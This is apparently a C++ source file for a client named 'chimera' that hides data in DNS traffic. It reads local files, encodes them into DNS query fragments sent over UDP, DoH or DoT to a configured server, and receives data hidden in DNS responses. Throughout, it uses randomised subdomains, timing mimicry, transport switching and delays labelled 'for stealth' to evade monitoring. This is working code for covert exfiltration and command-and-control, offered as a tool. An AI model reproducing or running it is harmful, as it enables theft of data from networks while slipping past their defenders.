#include "chimera/client.hpp"
#include "chimera/base64.hpp"
#include "chimera/dns_packet.hpp"
#include "chimera/Transport.hpp"
#include "chimera/BehavioralMimicry.hpp"
#include "chimera/steganography.hpp"
#include <iostream>
#include <random>
#include <thread>
#include <fstream>

namespace chimera {

tl::expected<SendResult, ChimeraError> ChimeraClient::send_text(const std::string& message) const {
    auto start_time = std::chrono::steady_clock::now();

    // Create appropriate transport
    auto transport = create_transport();
    if (!transport) {
        return tl::unexpected(ChimeraError::ConfigError);
    }
    
    transport->set_timeout(config_.timeout);

    // Behavioral mimicry: add random delay if enabled
    if (config_.adaptive_transport) {
        BehavioralMimicry mimicry(config_.behavioral_profile);
        mimicry.apply_behavioral_delay();
        
        // Potentially switch transport based on behavioral patterns
        if (mimicry.should_switch_transport()) {
            AdaptiveTransportManager transport_manager;
            auto recommended = mimicry.get_recommended_transport();
            // Use recommended transport for this request
            std::unique_ptr<ITransport> alt_transport;
            switch (recommended) {
                case TransportType::UDP:
                    alt_transport = std::make_unique<TransportUdp>(config_.dns_server, config_.dns_port);
                    break;
                case TransportType::DoH:
                    alt_transport = std::make_unique<TransportDoH>(config_.dns_server);
                    break;
                case TransportType::DoT:
                    alt_transport = std::make_unique<TransportDoT>(config_.dns_server, config_.dns_port);
                    break;
            }
            if (alt_transport) {
                transport = std::move(alt_transport);
                transport->set_timeout(config_.timeout);
            }
        }
    }

    // Base64 encoding
    std::string encoded_message;
    try {
        encoded_message = Base64::encode(message);
    } catch (const std::exception& e) {
        std::cerr << "Base64 encoding error: " << e.what() << std::endl;
        return tl::unexpected(ChimeraError::EncodingError);
    }

    // Domain generation
    std::string target_domain = config_.target_domain;
    if (config_.use_random_subdomains) {
        target_domain = generate_random_subdomain() + "." + config_.target_domain;
    }

    DnsQuestion question{target_domain, DnsType::TXT};
    std::vector<uint8_t> packet;
    try {
        packet = DnsPacketBuilder::build_query(question, encoded_message);
    } catch (const std::exception& e) {
        std::cerr << "DNS packet building error: " << e.what() << std::endl;
        return tl::unexpected(ChimeraError::DnsError);
    }

    auto send_result = transport->send(packet);
    if (!send_result) {
        std::cerr << "Send error" << std::endl;
        return tl::unexpected(ChimeraError::NetworkError);
    }

    auto end_time = std::chrono::steady_clock::now();
    auto latency = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time);

    std::cout << "Sent bytes: " << send_result.value() << std::endl;
    std::cout << "Used domain: " << target_domain << std::endl;
    std::cout << "Latency: " << latency.count() << " ms" << std::endl;

    return SendResult{
        .bytes_sent = send_result.value(),
        .latency = latency,
        .used_domain = target_domain
    };
}

tl::expected<std::chrono::milliseconds, ChimeraError> ChimeraClient::ping_dns_server() const {
    const auto start_time = std::chrono::steady_clock::now();

    auto transport = create_transport();
    if (!transport) {
        return tl::unexpected(ChimeraError::ConfigError);
    }
    
    transport->set_timeout(config_.timeout);

    const DnsQuestion ping_question{"ping.test", DnsType::A};
    std::vector<uint8_t> packet;
    try {
        packet = DnsPacketBuilder::build_query(ping_question);
    } catch (const std::exception& e) {
        std::cerr << "DNS packet building error for ping: " << e.what() << std::endl;
        return tl::unexpected(ChimeraError::DnsError);
    }

    auto send_result = transport->send(packet);
    if (!send_result) {
        std::cerr << "Ping send error" << std::endl;
        return tl::unexpected(ChimeraError::NetworkError);
    }

    auto recv_result = transport->receive();
    if (!recv_result) {
        std::cerr << "Ping receive error" << std::endl;
        return tl::unexpected(ChimeraError::NetworkError);
    }

    // Response processing
    std::vector<DnsResourceRecord> answers;
    try {
        DnsPacketBuilder::parse_response(recv_result.value(), answers);
    } catch (const std::exception& e) {
        std::cerr << "DNS response parsing error: " << e.what() << std::endl;
    }

    const auto end_time = std::chrono::steady_clock::now();
    auto latency = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time);

    std::cout << "Ping response size: " << recv_result.value().size() << " bytes" << std::endl;
    std::cout << "Answer count: " << answers.size() << std::endl;
    std::cout << "Ping latency: " << latency.count() << " ms" << std::endl;

    return latency;
}

std::string ChimeraClient::generate_random_subdomain() {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    static std::uniform_int_distribution<> dis(0, 35);
    std::string subdomain;
    constexpr char chars[] = "abcdefghijklmnopqrstuvwxyz0123456789";
    std::uniform_int_distribution<> length_dis(8, 12);
    const int length = length_dis(gen);
    for (int i = 0; i < length; ++i) {
        subdomain += chars[dis(gen)];
    }
    return subdomain;
}

std::unique_ptr<ITransport> ChimeraClient::create_transport() const {
    switch (config_.transport) {
        case TransportType::UDP:
            return std::make_unique<TransportUdp>(config_.dns_server, config_.dns_port);
        case TransportType::DoH:
            return std::make_unique<TransportDoH>(config_.dns_server);
        case TransportType::DoT:
            return std::make_unique<TransportDoT>(config_.dns_server, config_.dns_port);
        default:
            return nullptr;
    }
}

// Phase 3: Enhanced steganographic sending methods
tl::expected<SendResult, ChimeraError> ChimeraClient::send_data(const std::vector<uint8_t>& data) const {
    auto start_time = std::chrono::steady_clock::now();

    // Create steganographic encoder with client configuration
    EncodingConfig encoding_config;
    encoding_config.strategy = config_.encoding_strategy;
    encoding_config.use_compression = config_.use_compression;
    encoding_config.randomize_order = config_.randomize_fragments;
    encoding_config.noise_ratio = config_.noise_ratio;
    encoding_config.max_fragments = config_.max_fragments;

    SteganographicEncoder encoder(encoding_config);

    // Encode the data into fragments
    auto fragments_result = encoder.encode_payload(data, config_.target_domain);
    if (!fragments_result) {
        return tl::unexpected(ChimeraError::EncodingError);
    }

    auto fragments = fragments_result.value();
    
    // Create appropriate transport
    auto transport = create_transport();
    if (!transport) {
        return tl::unexpected(ChimeraError::ConfigError);
    }
    
    transport->set_timeout(config_.timeout);

    // Apply behavioral mimicry if enabled
    if (config_.adaptive_transport) {
        BehavioralMimicry mimicry(config_.behavioral_profile);
        mimicry.apply_behavioral_delay();
    }

    // Send each fragment
    size_t total_bytes_sent = 0;
    std::vector<DnsType> used_record_types;
    
    for (const auto& fragment : fragments) {
        // Create DNS query based on fragment type
        DnsQuestion question;
        question.name = fragment.domain;
        question.type = fragment.record_type;
        question.cls = DnsClass::IN;

        // Build and send the query
        auto packet = DnsPacketBuilder::build_query(question);
        auto send_result = transport->send(packet);
        
        if (!send_result) {
            return tl::unexpected(ChimeraError::NetworkError);
        }

        total_bytes_sent += fragment.encoded_data.size();
        used_record_types.push_back(fragment.record_type);

        // Small delay between fragments for stealth
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    auto end_time = std::chrono::steady_clock::now();
    auto latency = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time);

    SendResult result;
    result.bytes_sent = total_bytes_sent;
    result.latency = latency;
    result.used_domain = config_.target_domain;
    result.used_record_types = std::move(used_record_types);
    result.fragments_sent = fragments.size();
    result.encoding_used = config_.encoding_strategy;
    result.compression_used = config_.use_compression;

    return result;
}

tl::expected<SendResult, ChimeraError> ChimeraClient::send_file(const std::string& file_path) const {
    // Read file into memory
    std::ifstream file(file_path, std::ios::binary);
    if (!file) {
        return tl::unexpected(ChimeraError::ConfigError);
    }

    // Get file size
    file.seekg(0, std::ios::end);
    size_t file_size = file.tellg();
    file.seekg(0, std::ios::beg);

    // Read file data
    std::vector<uint8_t> file_data(file_size);
    file.read(reinterpret_cast<char*>(file_data.data()), file_size);
    file.close();

    // Send the file data using enhanced steganographic methods
    return send_data(file_data);
}

tl::expected<SendResult, ChimeraError> ChimeraClient::send_multi_record(const std::vector<uint8_t>& data) const {
    // Force multi-record encoding strategy
    ClientConfig temp_config = config_;
    temp_config.encoding_strategy = EncodingStrategy::MULTI_RECORD;
    
    ChimeraClient temp_client(temp_config);
    return temp_client.send_data(data);
}

tl::expected<std::vector<uint8_t>, ChimeraError> ChimeraClient::receive_data(const std::string& query_domain) const {
    // Create transport
    auto transport = create_transport();
    if (!transport) {
        return tl::unexpected(ChimeraError::ConfigError);
    }
    
    transport->set_timeout(config_.timeout);

    // Query for different record types to extract steganographic data
    std::vector<DnsResourceRecord> all_records;
    
    std::vector<DnsType> query_types = {DnsType::A, DnsType::AAAA, DnsType::TXT};
    
    for (auto record_type : query_types) {
        DnsQuestion question;
        question.name = query_domain;
        question.type = record_type;
        question.cls = DnsClass::IN;

        auto packet = DnsPacketBuilder::build_query(question);
        auto response = transport->send(packet);
        
        if (response) {
            auto receive_result = transport->receive();
            if (receive_result) {
                std::vector<DnsResourceRecord> records;
                DnsPacketBuilder::parse_response(receive_result.value(), records);
                all_records.insert(all_records.end(), records.begin(), records.end());
            }
        }
    }

    // Extract steganographic data from responses
    auto extracted = SteganographicExtractor::extract_from_dns_response(all_records);
    if (!extracted) {
        return tl::unexpected(ChimeraError::DecodingError);
    }

    return extracted.value();
}

size_t ChimeraClient::estimate_capacity() const {
    EncodingConfig encoding_config;
    encoding_config.strategy = config_.encoding_strategy;
    encoding_config.max_fragments = config_.max_fragments;
    
    return SteganographicEncoder::estimate_total_capacity(encoding_config);
}

} // namespace chimera